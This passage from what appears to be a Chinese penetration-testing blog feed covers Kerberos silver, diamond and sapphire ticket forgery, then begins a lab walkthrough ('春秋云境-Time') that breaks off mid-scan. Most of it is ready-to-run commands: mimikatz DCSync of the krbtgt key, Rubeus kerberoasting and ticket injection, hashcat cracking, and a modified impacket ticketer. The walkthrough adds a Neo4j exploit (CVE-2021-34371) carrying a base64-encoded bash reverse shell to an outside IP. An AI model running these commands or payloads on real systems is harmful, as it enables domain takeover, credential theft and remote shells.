href="#介绍-1" class="headerlink" title="介绍"></a>介绍</h3><p>白银票据是伪造的 <code>Kerberos Ticket Grant Service （TGS）</code> 票证，银票仅允许攻击者伪造特定服务的票证授予服务 （TGS） 票据。TGS 票证使用服务的密码哈希值进行加密，因此如果攻击者窃取了服务帐户的哈希值，就可以生成白银票据。</p><h3 id="利用条件-1"><a href="#利用条件-1" class="headerlink" title="利用条件"></a>利用条件</h3><p>白银票据所需的利用条件和黄金票据是相同的，只是秘钥换成了对应服务的机器账户 Hash(尾部带$的均为机器账户)</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">目标域名：我这里是rootkit.org</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">目标域的sid：刚刚lsadump::lsa 有显示S-1-5-21-3759881954-2993291187-3577547808 或者whami /all也可以查看</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">要模拟的用户账户名称：例如 Administrator</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">要模拟的用户RID：RID是SID右边的数字，例如管理员是500</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">该账户所属组的RID:域用户和域管理员的RID分别是512和513</span><br></pre></td></tr></table></figure><h3 id="尝试-mimikatz-注入票据"><a href="#尝试-mimikatz-注入票据" class="headerlink" title="尝试 mimikatz 注入票据"></a>尝试 mimikatz 注入票据</h3><p>CIFS文件共享服务的密码和计算机账户相同，使用 mimikatz 抓一下密码</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">privilege::debug</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">sekurlsa::logonpasswords</span><br></pre></td></tr></table></figure><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2025/png/25663185/1742536921259-808acbec-9796-4f9d-a204-00cea47f560c.png"></p><p>查看Sid</p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2025/png/25663185/1742536921385-2dffc8b8-5d8a-419f-a471-5c40b293a275.png"></p><p>注入票据</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">kerberos::golden /sid:S-1-5-21-202412995-3582062751-167045153 /domain:rootkit.org /target:SRV-WEB-KIT.rootkit.org /service:cifs /rc4:78e1c42dbff68fdd87ea7abd70b67533 /user:1111 /ptt</span><br></pre></td></tr></table></figure><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2025/png/25663185/1742536921665-4ee8aff1-f92f-4fd4-917c-d772ee74946f.png"></p><h3 id="使用-rubeus-进行注入"><a href="#使用-rubeus-进行注入" class="headerlink" title="使用 rubeus 进行注入"></a>使用 rubeus 进行注入</h3><p>下面将尝试获取 <code>mssql</code> 服务的票据，由于本地测试，需要向服务添加一个账户sqluser来运行</p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2025/png/25663185/1742536921725-9df94bfe-a8de-4fae-ba1b-c0186f83c0b1.png"></p><p>使用 rubeus 转储 tgs</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">rubeus.exe kerberoast /domain:rootkit.org /creduser:rootkit\windows7 /credpassword:admin!@#45 /nowrap</span><br></pre></td></tr></table></figure><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2025/png/25663185/1742536921761-03d46e3f-0413-4217-99e3-1e890e475700.png"></p><p>使用 hashcat 爆破密码,密码为 Admin12345</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hashcat -m 13100 &#x27;$krb5tgs$23$*sqluser......省略&#x27; &#x27;/home/kali/Desktop/10_million_password_list_top_100000.txt&#x27;  --force</span><br></pre></td></tr></table></figure><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2025/png/25663185/1742536922395-930e9a08-e795-45cf-aadd-55fbdf985673.png"></p><p>使用 <code>rubeus</code>转为 <code>ntlm hash</code></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Rubeus.exe hash /password:Admin12345</span><br></pre></td></tr></table></figure><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2025/png/25663185/1742536921875-823e2569-db4e-4d1e-ad5b-b05ac6fadfc4.png"></p><p>使用<code>whoami /user</code>获取sid，服务名<code>service</code>是上面<code>kubeus</code>获取到的服务名</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">rubeus.exe silver /service:MSSQLSvc/win7.rootkit.org /rc4:CCEF208C6485269C20DB2CAD21734FE7 /sid:S-1-5-21-3759881954-2993291187-3577547808 /user:test123333 /domain:rootkit.org /ptt</span><br></pre></td></tr></table></figure><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2025/png/25663185/1742536922009-c0b4a07f-428f-4a86-8304-d5e4a4f9e7c8.png"></p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2025/png/25663185/1742536922048-216b5f33-bb52-40e0-8112-2a31cde5f87e.png"></p><p>远程连接数据库执行命令即可</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlcmd -S 192.168.1.2,1433</span><br></pre></td></tr></table></figure><h3 id="黄金票据与白银票据的区别"><a href="#黄金票据与白银票据的区别" class="headerlink" title="黄金票据与白银票据的区别"></a>黄金票据与白银票据的区别</h3><ol><li>访问权限不同</li></ol><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">黄金票据 伪造TGT,可以获取任何Kerberos服务权限 </span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">白银票据 伪造TGS,只能访问指定的服务，白银票据的权限就远不如黄金票据的权限</span><br></pre></td></tr></table></figure><ol><li>加密方式不同</li></ol><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">黄金票据 由Kerberos的NTLM Hash加密 </span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">白银票据 由服务账号(通常为计算机账户)NTLM Hash加密，更加隐蔽</span><br></pre></td></tr></table></figure><ol><li>认证流程不同</li></ol><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">黄金票据 利用过程需要访问域控DC</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">白银票据 不经过KDC，因此白银票据日志相对于黄金票据会更少，同时白银票据的日志都在目标服务器上，域控上不会有日志</span><br></pre></td></tr></table></figure><h2 id="0x04-钻石票据-Diamond-Ticket"><a href="#0x04-钻石票据-Diamond-Ticket" class="headerlink" title="0x04 钻石票据 Diamond Ticket"></a>0x04 钻石票据 Diamond Ticket</h2><p>黄金票据攻击和钻石票据攻击都需要访问<code>krbtgt</code>密钥。然而，钻石票据攻击需要访问<code>AES256</code>密钥。黄金票证攻击则是利用伪造票证授予票证 (TGT) ，而钻石票证攻击则利用了<a href="https://so.csdn.net/so/search?q=%E5%9F%9F%E6%8E%A7%E5%88%B6%E5%99%A8&spm=1001.2101.3001.7020">域控制器</a> (DC) 请求的真实 TGT 进行解密和重新加密进行票据攻击。</p><p>黄金票据充分利用了能够从头开始伪造票据授予票据 (TGT) 的优势，而钻石票据则利用了能够解密和重新加密从域控制器 (DC) 请求的真实 TGT 的优势。</p><h3 id="钻石PAC"><a href="#钻石PAC" class="headerlink" title="钻石PAC"></a>钻石PAC</h3><p><strong>什么是PAC</strong></p><p>PAC 是一种传递域控制器 (DC)提供的授权相关信息的结构。身份验证协议使用 PAC 来验证身份以传输授权信息，从而控制对资源的访问。说白了就是来验证身份是否有效的。</p><p>最初的<code>钻石PAC</code>攻击远没有钻石票据灵活，攻击成功需要两个条件</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">1. 在没有特权属性证书（PAC）的情况下请求TGT</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">2. 确保要访问的服务的服务帐户未在其 UserAccountControl (UAC) 属性中设置“NA”位</span><br></pre></td></tr></table></figure><p>在服务帐户的 UAC 属性中设置 NA 位后，向该服务帐户请求的 ST 没有 PAC ，攻击者下一个阶段就可以构造恶意 PAC 注入到 ST 中实现攻击。</p><p>由于2021年发布的补丁无法再在完全最新的域控制器 (DC) 上使用没有 PAC 的 TGT。我们知道需要拥有<code>KRBTGT</code>密钥，并且攻击利用任何其他有效帐户来请求 TGT。所以我们想为什么不直接解密该 TGT，按照我们想要的方式修改它，重新计算 PAC 签名，然后重新加密它。这就是我们所说的钻石票据。</p><h3 id="钻石票据攻击利用"><a href="#钻石票据攻击利用" class="headerlink" title="钻石票据攻击利用"></a>钻石票据攻击利用</h3><p>我们使用钻石票据的思路就是使用低权限的用户向域控请求一个普通的 <code>TGT</code>，随后进行解密修改签名和重新加密即可，当然这些事情<code>Rubeus</code>会自动帮我们完成，我们只需要提供信息即可。</p><p>本地尝试<code>dir</code>拒绝访问</p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2025/png/25663185/1742536922104-5c0d301a-4cda-4f2a-98df-9519564ba10d.png"></p><p>使用 <code>mimikatz</code> 抓取 <code>krbtgt</code> 用户 <code>aes256</code>密钥</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mimikatz.exe &quot;privilege::debug&quot; &quot;lsadump::dcsync /domain:rootkit.org /user:krbtgt&quot; &quot;exit&quot;</span><br></pre></td></tr></table></figure><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2025/png/25663185/1742536922304-f15d4dc5-0f08-4339-926a-9224decc76d1.png"></p><p>使用钻石票据需要提供以下信息</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">krbkey:3e65833fc9930ea83015501ec30c161da401faf6cfed9526b9ceff16c8ade745</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">低权限用户user:micle</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">用户密码password:Admin12345</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">domain:rootkit.org</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">dc:owa2013.rootkit.org</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">ticketuser:administrator //伪造的票据用户名可以任意，不需要域中存在该用户</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Rubeus.exe diamond /krbkey:3e65833fc9930ea83015501ec30c161da401faf6cfed9526b9ceff16c8ade745 /user:micle /password:Admin12345 /enctype:aes /domain:rootkit.org /dc:owa2013.rootkit.org /ticketuser:test123 /ptt /nowrap</span><br></pre></td></tr></table></figure><p>以下为原<code>TGT</code></p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2025/png/25663185/1742536922598-210360e7-d4a6-4ba0-97ee-e61172bd12e6.png"></p><p>解密重新构造的<code>TGT</code></p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2025/png/25663185/1742536922645-20d41036-0050-40c9-bc0e-8ec294ccb659.png"></p><p>利用我们重新构造的<code>TGT</code>对域控的<code>cifs</code>服务进行票据注入。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Rubeus.exe asktgs /ticket:doIFMjCCBS6gAwIBBaEDAgEWooIEOzCCBDdhggQzMIIEL6ADAgEFoQ0bC1JPT1RLSVQuT1JHoiAwHqADAgECoRcwFRsGa3JidGd0GwtST09US0lULk9SR6OCA/UwggPxoAMCARKhAwIBA6KCA+MEggPfj2PsZr7SGEqJsPPl5wG8ljBVM4yBAtxGQNxTQQPo6WBMTxcXS+3f3vyYs6qab0uZ+X5UW45e4aW8T8VhsTOkSJ1jokudegt8ILFKbHNpuUTMywsfgjRb6o+CQkfyZMGep1bQ9FoKHw+qPyd6ql7bYK50u1zO+uhNQ61cQDymFiDaqu0UBLh9yI4qY81gpycKOZSWqy0T/cH52hn22IuuxfL9dKN9qdRF+YCnrqy9MBSPx5E3MGVroJZrLYqgDfPQ9g+u1pPabnci8ac3J2S8isxbTscP7hutRATWTQWeauRvG1DbNN6qANWagDNpPy9JEqQoLbqrr3GD/FEQhaANSZlX2IPzLj8EsUcKQExEVSaWC3OuUwqNGWBNhc1m+aJL9mt6D42SwWMyFvmREmlj/lDR9kv9IQmqupcFCloBkewpyFBlecHkkSFKwXGvde65Y7Z/5vP1Iq1el2VrZPPMhywUhk5JwnRNhInDokhYFOWMIdY3w/C2PreLdEiL5aFUc7e01y7uQV5Wbe/OJ6XZdNhbYKXZ9lzZdHAqSayQmo0TRpBCBwqAZUFZse3l5B7qwPP9WBJDLIZtNgV6GUt0CW9DVoIW0jdM1j2Hkl9B+CeM1xV7Vb2DMNh8gK6IfT7KWEHX8a+0GVwlQWkAW/O/IpjZc8+3rIkiIfCIqbGTwA/pnjfhsS2lOXetwW6S4jQ8C9SfKZbLWhPIxpRs9q9g3tWMUE22Pk06CD3T9GbdTEbVi0IvCQJSgNIGMu+sI9ISVZ78HNmYv2wAjjC0tcHusjG1DDj0obyfeg99icK1ZtZL0HmOcQCSwNZqqJDMOXix1uKXv8auJP0itVdUf/aYp8l0xDjVQRYzvefpuar1Ce2Dhguejc6nEfPKusFBPDNhYGw8WlSupnCjjwgNuuQT1WUXdNuTMpPAh3Grb0dj/2s3/WcqVI3P9eZMos6n+MnD8RJUjytPGAm+iKa30KmL3nJbxQEdBOCI9cY4SYmf09B9fQJhG7fEwyeUyjcRoCeOeLFlSM8MCs/qHUi+0MTkVyyiLYZWfcNY+20dCbwUtRz6zXUwQ4go8buZoZMKqnnio1rtzZxzqkqiYK+AbtRq7+9JPuX0chOr9GKqGQGEqaQZCqjOVCQKr1A+JK4mfhHxGwe0eDaDtGOTUnszGLhqQdmDVxNpKduOLjaQBN97ACnitC3Q1Ww6ZeCv51TVh2x787nNkYy5JWZrY0gd3FByb9UDkMmeODy/1oVireCYEfLAL8yUuu/REgZbkyIsxzSCeG/NUZN6ztjGn/IrJ06bEQS6OhuvPHKP51JIh/8HUaOB4jCB36ADAgEAooHXBIHUfYHRMIHOoIHLMIHIMIHFoCswKaADAgESoSIEIFPwBQgPPeImtpqHK3V4zobqMKDh0uVBzmEB/v5GuE7noQ0bC1JPT1RLSVQuT1JHohQwEqADAgEBoQswCRsHdGVzdDEyM6MHAwUAQOEAAKURGA8yMDI0MDIwNTA0Mjk0OFqmERgPMjAyNDAyMDUxNDI5NDhapxEYDzIwMjQwMjEyMDQyOTQ4WqgNGwtST09US0lULk9SR6kgMB6gAwIBAqEXMBUbBmtyYnRndBsLUk9PVEtJVC5PUkc= /service:cifs/owa2013.rootkit.org /ptt /nowrap</span><br></pre></td></tr></table></figure><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2025/png/25663185/1742536922814-b62d59c0-9e90-48e1-bdc2-e509edb3ae89.png"></p><p>查看票据发现已经存在</p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2025/png/25663185/1742536922692-99837381-7891-4bc1-b5ba-e63370da5a4a.png"></p><p>尝试 <code>dir</code>域控和<code>psexec</code>均成功</p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2025/png/25663185/1742536922835-ee4de11a-b136-4e08-aa64-f5e739743130.png"></p><p>这种技术相比于金票更加隐蔽，因为过程中所申请的TGT是真实的，只是修改了PAC，相对你金票离线生成<code>TGT</code>更符合OPSEC</p><h2 id="0x05-蓝宝石票据-Sapphire-Ticket"><a href="#0x05-蓝宝石票据-Sapphire-Ticket" class="headerlink" title="0x05 蓝宝石票据 Sapphire Ticket"></a>0x05 蓝宝石票据 Sapphire Ticket</h2><p>蓝宝石票据与钻石票据类似，票据不是伪造的，而是通过请求后获得的合法票据。他们的区别在于<code>PAC</code>的修改方式。钻石票据是修改了合法<code>PAC</code>以添加特权组。在蓝宝石票据中，高权限用户<code>PAC</code>是通过</p><p><code>S4U2Self+U2U</code>获得的，然后该<code>PAC</code>会替换原来的<code>PAC</code>，由于该票据是完全合法元素组合起来的，所以是最难检测的票据。</p><h3 id="S4U2self-U2U"><a href="#S4U2self-U2U" class="headerlink" title="S4U2self + U2U"></a>S4U2self + U2U</h3><p>为了在 Kerberos 协议层面对约束性委派进行支持，微软扩展了 <code>S4U2self</code> 协议，而使用 U2U 可以在没有 SPN 的情况下请求 <code>S4U2Self</code>。</p><h3 id="尝试生成蓝宝石票据"><a href="#尝试生成蓝宝石票据" class="headerlink" title="尝试生成蓝宝石票据"></a>尝试生成蓝宝石票据</h3><p>在这里使用魔改过的 <code>ticketer.py</code></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://github.com/ShutdownRepo/impacket/tree/6c9a1aadbfc11e321858a640b596530535b11fd1</span><br></pre></td></tr></table></figure><p>将域控的ip地址加入hosts，使用如下命令生成票据</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python ticketer.py -request -impersonate &#x27;administrator&#x27; -domain &#x27;rootkit.org&#x27; -user &#x27;micle&#x27; -password &#x27;Admin12345&#x27; -aesKey &#x27;3e65833fc9930ea83015501ec30c161da401faf6cfed9526b9ceff16c8ade745&#x27; -domain-sid &#x27;S-1-5-21-3759881954-2993291187-3577547808&#x27; -nthash &#x27;c3d5042c67ef5f461d0ba6ecdd9ea449&#x27; &#x27;Sapphire&#x27;</span><br></pre></td></tr></table></figure><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2025/png/25663185/1742536923342-f15f079d-489d-405b-abfb-1a649ec8033c.png"></p><p>通过抓包可以看到我们指定了要获取服务票证的用户名<code>administrator</code> ，此外我们还为用户请求了服务票证，执行 <code>U2U</code></p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2025/png/25663185/1742536923186-65feb858-d341-4059-9350-ca76d1325c73.png"></p><p>使用<code>mimikatz</code>导入该票据，成功<code>dir</code>域控</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">kerberos::ptc ignored.ccache</span><br></pre></td></tr></table></figure><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2025/png/25663185/1742536923259-0b1f25be-be36-40ec-9055-b7f64dfcafdf.png"></p><p>由于该票据很难被检测到，只能通过人工排查<code>krbrgt</code>账户被盗等情况入手</p><p>参考：<a href="https://xz.aliyun.com/news/13032?time__1311=eqUxuDcDBD0Dg7CeDsjOxiqiKmx7Tw+YRpD&u_atoken=f52bd5554f81e725f08eebdd4ea25593&u_asig=0a472f9017425368091076282e0119">https://xz.aliyun.com/news/13032?time__1311=eqUxuDcDBD0Dg7CeDsjOxiqiKmx7Tw%2BYRpD&amp;u_atoken=f52bd5554f81e725f08eebdd4ea25593&amp;u_asig=0a472f9017425368091076282e0119</a></p>]]></content>
      
      
      <categories>
          
          <category> 内网攻防 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 域 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>春秋云境-Time</title>
      <link href="/2025/03/10/%E5%9F%9F%E6%B8%97%E9%80%8F/%E6%98%A5%E7%A7%8B%E4%BA%91%E5%A2%83-Time/"/>
      <url>/2025/03/10/%E5%9F%9F%E6%B8%97%E9%80%8F/%E6%98%A5%E7%A7%8B%E4%BA%91%E5%A2%83-Time/</url>
      
        <content type="html"><![CDATA[<p>先fscan扫描</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">fscan.exe -h 39.98.107.233</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">   ___                              _</span><br><span class="line">  / _ \     ___  ___ _ __ __ _  ___| | __</span><br><span class="line"> / /_\/____/ __|/ __| &#x27;__/ _` |/ __| |/ /</span><br><span class="line">/ /_\\_____\__ \ (__| | | (_| | (__|   &lt;</span><br><span class="line">\____/     |___/\___|_|  \__,_|\___|_|\_\</span><br><span class="line">                     fscan version: 1.8.3</span><br><span class="line">start infoscan</span><br><span class="line">39.98.107.233:7687 open</span><br><span class="line">39.98.107.233:22 open</span><br><span class="line">[*] alive ports len is: 2</span><br></pre></td></tr></table></figure><h2 id="CVE-2021-34371"><a href="#CVE-2021-34371" class="headerlink" title="CVE-2021-34371"></a>CVE-2021-34371</h2><p>7678有个nday，CVE-2021-34371利用（<a href="https://github.com/zwjjustdoit/CVE-2021-34371.jar">https://github.com/zwjjustdoit/CVE-2021-34371.jar</a>）</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">java -jar rhino_gadget.jar rmi://39.99.147.195:1337 &quot;bash -c &#123;echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xLjkyLjE0OC4zMy81Njc4IDA+JjE=&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;&quot;</span><br></pre></td></tr></table></figure><p>找一下flag</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">find / -name flag*</span><br></pre></td></tr></table></figure><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2025/png/25663185/1741602823953-92635713-c082-4fc4-a05b-23b297d6a879.png"></p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2025/png/25663185/1741602870437-570782f5-a6ec-442b-b28d-514ff72ab204.png"></p><p>提示认证流程</p><h2 id="内网渗透"><a href="#内网渗透" class="headerlink" title="内网渗透"></a>内网渗透</h2><p>接下来常规思路，上代理，扫描</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">(remote) neo4j@ubuntu:/tmp$ ifconfig</span><br><span class="line">eth0: flags=4163&lt;UP,BROADCAST,RUNNING,MULTICAST&gt;  mtu 1500</span><br><span class="line">        inet 172.22.6.36  netmask 255.255.0.0  broadcast 172.22.255.255</span><br><span class="line">        inet6 fe80::216:3eff:fe16:7073  prefixlen 64  scopeid 0x20&lt;link&gt;</span><br><span class="line">        ether 00:16:3e:16:70:73  txqueuelen 1000  (Ethernet)</span><br><span class="line">        RX packets 78768  bytes 112010111 (112.0 MB)</span><br><span class="line">        RX errors 0  dropped 0  overruns 0  frame 0</span><br><span class="line">        TX packets 14275  bytes 1872331 (1.8 MB)</span><br><span class="line">        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0</span><br><span class="line"></span><br><span class="line">lo: flags=73&lt;UP,LOOPBACK,RUNNING&gt;  mtu 65536</span><br><span class="line">        inet 127.0.0.1  netmask 255.0.0.0</span><br><span class="line">        inet6 ::1  prefixlen 128  scopeid 0x10&lt;host&gt;</span><br><span class="line">        loop  txqueuelen 1000  (Local Loopback)</span><br><span class="line">        RX packets 764  bytes 64981 (64.9 KB)</span><br><span class="line">        RX errors 0  dropped 0  overruns 0  frame 0</span><br><span class="line">        TX packets 764  bytes 64981 (64.9 KB)</span><br><span class="line">        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line">(remote) neo4j@ubuntu:/tmp$ ./fscan -h 172.22.6.0/24</span><br><span class="line"></span><br><span class="line">   ___                              _    </span><br><span class="line">  / _ \     ___  ___ _ __ __ _  ___| | __ </span><br><span class="line"> / /_\/____/ __|/ __| &#x27;__/ _` |/ __| |/ /</span><br><span class="line">/ /_\\_____\__ \ (__| | | (_| | (__|   &lt;    </span><br><span class="line">\____/     |___/\___|_|  \__,_|\___|_|\_\   </span><br><span class="line">                     fscan version: 1.8.4</span><br><span class="line">start infoscan</span><br><span class="line">trying RunIcmp2</span><br><span class="line">The current user permissions unable to send icmp packets</span><br><span class="line">start ping</span><br><span class="line">(icmp) Target 172.22.6.25     is alive</span><br><span class="line">(icmp) Target 172.22.6.36     is alive</span><br><span class="line">(icmp) Target 172.22.6.38     is alive</span><br><span class="line">(icmp) Target 172.22.6.12     is alive</span><br><span class="line">[*] Icmp alive hosts len is: 4</span><br><span class="line">172.22.6.12:445 open</span><br><span class="line">172.22.6.25:445 open</span><br><span class="line">172.22.6.12:139 open</span><br><span class="line">172.22.6.25:139 open</span><br><span class="line">172.22.6.12:135 open</span><br><span class="line">172.22.6.25:135 open</span><br><span class="line">172.22.6.38:80 open</span><br><span class="line">172.22.6.38:22 open</span><br><span class="line">172.22.6.36:22 open</span><br><span class="line">172.22.6.12:88 open</span><br><span class="line">172.22.6.36:7687 open</span><br><span class="line">[*] alive ports len is: 11</span><br><span class="line">start vulscan</span><br><span class="line">[*] NetInfo </span><br><span class="line">[*]172.22.6.12</span><br><span class="line">   [-&gt;]DC-PROGAME</span><br><span class="line">   [-&gt;]172.22.6.12</span><br><span class="line">[*] NetBios 172.22.6.25     XIAORANG\WIN2019              </span><br><span class="line">[*] NetInfo </span><br><span class="line">[*]172.22.6.25</span><br><span class="line">   [-&gt;]WIN2019</span><br><span class="line">   [-&gt;]172.22.6.25</span><br><span class="line">[*] OsInfo 172.22.6.12  (Windows Server 2016 Datacenter 14393)</span><br><span class="line">[*] NetBios 172.22.6.12     [+] DC:DC-PROGAME.xiaorang.lab       Windows Server 2016 Datacenter 14393</span><br><span class="line">[*] WebTitle http://172.22.6.38        code:200 len:1531   title:后台登录</span><br><span class="line">[*] WebTitle https://172.22.6.36:7687  code:400 len:50     title:None</span><br><span class="line">已完成 11/11</span><br><span class="line">[*] 扫描结束,耗时: 13.741722334s</span><br></pre></td></tr></table></figure><p>分析一下</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">172.22.6.12     域控</span><br><span class="line">172.22.6.25     域内机器</span><br><span class="line">172.22.6.36     当前机器</span><br><span 